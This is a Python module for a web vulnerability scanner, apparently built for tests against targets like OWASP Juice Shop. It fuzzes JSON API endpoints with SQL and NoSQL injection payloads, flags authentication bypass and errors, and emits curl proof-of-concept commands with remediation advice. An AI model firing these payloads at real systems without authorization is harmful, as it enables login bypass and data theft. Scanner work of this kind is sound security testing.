"""
API Fuzzer Module
Specifically designed to fuzz JSON-based REST APIs and SPAs (like OWASP Juice Shop).
It takes discovered API endpoints and tests them with JSON body injections.
"""

import json
from typing import List, Dict, Any, Set
from urllib.parse import urlparse
import time

class APIFuzzer:
    def __init__(self, target_url: str, http_client: Any = None):
        self.target_url = target_url
        
        # Use shared HttpClient if provided
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r
            
        # Payloads specifically designed to bypass JSON parsers and hit the DB
        self.sql_payloads = [
            "' OR 1=1--",
            "' OR '1'='1",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        self.nosql_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$ne": ""},
            {"$where": "1==1"},
        ]
        
        # Common JSON keys used in authentication and data retrieval
        self.common_keys = [
            "email", "password", "user", "username", "pass",
            "id", "query", "search", "token", "userId"
        ]

    def _test_endpoint_json(self, endpoint: str) -> List[Dict[str, Any]]:
        findings = []
        
        # Try both POST and PUT as they commonly accept JSON bodies
        for method in ["POST", "PUT"]:
            # Test SQLi in JSON values
            for payload in self.sql_payloads:
                # Build a generic JSON body with the payload in common fields
                body = {key: payload for key in self.common_keys}
                
                try:
                    if method == "POST":
                        response = self.http.post(endpoint, json=body, timeout=8)
                    else:
                        response = self.http.request("PUT", endpoint, json=body, timeout=8)
                        
                    # Check for SQL errors or successful auth bypass (e.g., returning a token)
                    response_text = response.text.lower()
                    
                    # 1. Error-based detection
                    error_patterns = ["sql syntax", "sqlite", "mysql", "postgres", "ora-", "unexpected token"]
                    for pattern in error_patterns:
                        if pattern in response_text:
                            findings.append({
                                "name": "API SQL Injection (JSON Body)",
                                "severity": "critical",
                                "owasp_category": "A03:2021",
                                "url": endpoint,
                                "parameter": "JSON Body",
                                "confidence": 95,
                                "technique": f"Error-based ({method})",
                                "evidence": {
                                    "payload": body,
                                    "error_pattern": pattern,
                                    "response_snippet": response.text[:200]
                                },
                                "poc": f"curl -X {method} -H 'Content-Type: application/json' -d '{json.dumps(body)}' {endpoint}",
                                "remediation": "Use parameterized queries and strictly validate JSON input schema."
                            })
                            break
                            
                    # 2. Auth Bypass Detection (Look for JWTs or user objects in a 200 OK)
                    if response.status_code in [200, 201]:
                        if "token" in response_text or "bearer" in response_text or "authorization" in response_text:
                            # Verify it's not just returning the string we sent
                            if payload.lower() not in response_text:
                                findings.append({
                                    "name": "API Authentication Bypass (SQLi)",
                                    "severity": "critical",
                                    "owasp_category": "A07:2021",
                                    "url": endpoint,
                                    "parameter": "JSON Body",
                                    "confidence": 90,
                                    "technique": "Auth Bypass via SQLi",
                                    "evidence": {
                                        "payload": body,
                                        "response_status": response.status_code,
                                        "response_snippet": response.text[:200]
                                    },
                                    "poc": f"curl -X {method} -H 'Content-Type: application/json' -d '{json.dumps(body)}' {endpoint}",
                                    "remediation": "Implement proper parameterized queries for authentication logic."
                                })
                except Exception:
                    continue

            # Test NoSQLi with JSON objects
            for nosql_payload in self.nosql_payloads:
                body = {key: nosql_payload for key in self.common_keys}
                
                try:
                    if method == "POST":
                        response = self.http.post(endpoint, json=body, timeout=8)
                    else:
                        response = self.http.request("PUT", endpoint, json=body, timeout=8)
                        
                    response_text = response.text.lower()
                    
                    # Look for auth bypass or massive data dumps
                    if response.status_code in [200, 201] and len(response.text) > 500:
                         findings.append({
                                "name": "API NoSQL Injection (JSON Body)",
                                "severity": "critical",
                                "owasp_category": "A03:2021",
                                "url": endpoint,
                                "parameter": "JSON Body",
                                "confidence": 85,
                                "technique": f"Operator Injection ({method})",
                                "evidence": {
                                    "payload": body,
                                    "response_status": response.status_code,
                                    "response_length": len(response.text)
                                },
                                "poc": f"curl -X {method} -H 'Content-Type: application/json' -d '{json.dumps(body)}' {endpoint}",
                                "remediation": "Sanitize input and use ODM with built-in protection against operator injection."
                            })
                except Exception:
                    continue
                    
        return findings

    def scan(self, endpoints: List[str]) -> List[Dict[str, Any]]:
        """Main scan method for the API Fuzzer"""
        all_findings = []
        
        # Filter for likely API endpoints to reduce noise
        api_endpoints = set()
        for ep in endpoints:
            ep_lower = ep.lower()
            if any(marker in ep_lower for marker in ['/api/', '/rest/', '/v1/', '/login', '/auth', '/user']):
                api_endpoints.add(ep)
                
        # If we didn't find specific API markers, just test a subset of all endpoints
        if not api_endpoints:
            api_endpoints = set(endpoints[:20])

        print(f"[APIFuzzer] Testing {len(api_endpoints)} likely API endpoints for JSON injection...")
        
        for endpoint in api_endpoints:
            findings = self._test_endpoint_json(endpoint)
            # Deduplicate findings per endpoint based on name
            seen_names = set()
            for finding in findings:
                if finding['name'] not in seen_names:
                    all_findings.append(finding)
                    seen_names.add(finding['name'])
                    
        print(f"[APIFuzzer] Scan complete. Found {len(all_findings)} API vulnerabilities.")
        return all_findings
